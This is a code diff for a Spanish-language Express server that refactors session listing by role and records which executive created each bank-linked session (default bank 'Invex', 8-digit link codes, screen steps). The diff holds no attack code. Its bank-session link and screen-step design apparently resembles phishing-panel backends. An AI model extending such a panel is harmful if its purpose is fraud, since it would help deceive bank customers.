@@ -833,50 +833,30 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
       }
       
       const { type = 'current' } = req.query;
-      const user = req.user;
-      console.log(`[Sessions] Usuario ${user.username} solicitando sesiones, tipo: ${type}, rol: ${user.role}`);
+      const user = req.user as any;
+      console.log(`[Sessions] Usuario ${user.username} solicitando sesiones, tipo: ${type}, rol: ${user.role}, isExecutive: ${user.isExecutive}`);
       
-      // Obtenemos todas las sesiones para que estén siempre actualizadas
-      const allSessions = await storage.getAllSessions();
+      const isExecutive = user.isExecutive === true;
       
-      // Filtramos según el tipo solicitado
+      // Usar los métodos de storage que ya tienen filtrado
       let sessions;
-      if (type === 'saved') {
-        sessions = allSessions.filter(s => s.saved === true);
-        console.log(`[Sessions] Hay ${sessions.length} sesiones guardadas filtradas de ${allSessions.length} totales`);
-      } else if (type === 'all') {
-        sessions = allSessions;
-        console.log(`[Sessions] Obtenidas ${sessions.length} sesiones (todas)`);
-      } else {
-        // Para sesiones actuales, incluimos todas las sesiones
-        // Ya no filtramos por saved ya que esto hace que no se muestren las sesiones recién creadas
-        sessions = allSessions;
-        console.log(`[Sessions] Obtenidas ${sessions.length} sesiones actuales filtradas de ${allSessions.length} totales`);
-      }
       
-      // Filtrando las sesiones según el usuario
-      const isSuperAdmin = user.username === 'balonx';
-      const isAdmin = user.role === 'admin';
-      
-      if (!isAdmin) {
-        const beforeCount = sessions.length;
-        
-        // Verificar explícitamente la existencia del campo createdBy para cada sesión
-        sessions.forEach((session, index) => {
-          if (!session.createdBy) {
-            console.log(`[Alert] Sesión ${session.sessionId} sin creador asignado.`);
-          }
-        });
-        
-        // Filtrar solo las sesiones creadas por este usuario
-        sessions = sessions.filter(session => session.createdBy === user.username);
-        
-        console.log(`[Sessions] Usuario ${user.username} (rol: ${user.role}), mostrando ${sessions.length} de ${beforeCount} sesiones`);
-      } else if (isSuperAdmin) {
-        console.log(`[Sessions] Superadministrador balonx accediendo a todas las sesiones (${sessions.length})`);
+      if (user.role === 'admin') {
+        // Admin ve todas las sesiones
+        if (type === 'saved') {
+          sessions = await storage.getSavedSessions();
+        } else {
+          sessions = await storage.getCurrentSessions();
+        }
+        console.log(`[Sessions] Admin ${user.username} accediendo a ${sessions.length} sesiones (tipo: ${type})`);
       } else {
-        // Este es un admin regular (no es balonx)
-        console.log(`[Sessions] Administrador ${user.username} accediendo a todas las sesiones (${sessions.length})`);
+        // Usuario normal o ejecutivo - filtrar por userId
+        if (type === 'saved') {
+          sessions = await storage.getSavedSessions(user.id, isExecutive);
+        } else {
+          sessions = await storage.getCurrentSessions(user.id, isExecutive);
+        }
+        console.log(`[Sessions] Usuario ${user.username} (ejecutivo: ${isExecutive}), mostrando ${sessions.length} sesiones (tipo: ${type})`);
       }
       
       // Ordenamos por fecha más reciente primero
@@ -899,11 +879,8 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         return res.status(401).json({ message: "No autenticado" });
       }
 
-      const user = req.user;
+      const user = req.user as any;
       const { banco = "Invex" } = req.body;
-      
-      // Verificar si es un ejecutivo
-      const executiveData = (req.session as any).executiveData;
       
       // Generamos un código de 8 dígitos y lo usamos como ID de sesión
       let codeForSession = '';
@@ -917,8 +894,8 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         banco,
         folio: codeForSession,
         pasoActual: ScreenType.FOLIO,
-        createdBy: user.username,
-        executiveId: executiveData?.executiveId || null, // Incluir executiveId si es ejecutivo
+        createdBy: user.isExecutive ? user.officeUsername : user.username,
+        executiveId: user.isExecutive ? user.id : null, // Incluir executiveId si es ejecutivo
       });
       
       // Guardar la sesión automáticamente para que aparezca en el historial
@@ -1336,9 +1313,6 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         });
       }
 
-      // Verificar si es un ejecutivo
-      const executiveData = (req.session as any).executiveData;
-      
       // Generamos un código de 8 dígitos numéricos que usaremos tanto para el ID como para el folio
       let linkCode = '';
       for (let i = 0; i < 8; i++) {
@@ -1353,8 +1327,8 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         banco: banco as string,
         folio: linkCode, // Mismo código para el folio
         pasoActual: ScreenType.FOLIO,
-        createdBy: user.username,
-        executiveId: executiveData?.executiveId || null, // Incluir executiveId si es ejecutivo
+        createdBy: (user as any).isExecutive ? (user as any).officeUsername : user.username,
+        executiveId: (user as any).isExecutive ? (user as any).id : null, // Incluir executiveId si es ejecutivo
       });
 
       // Guardar la sesión automáticamente para que aparezca en el historial
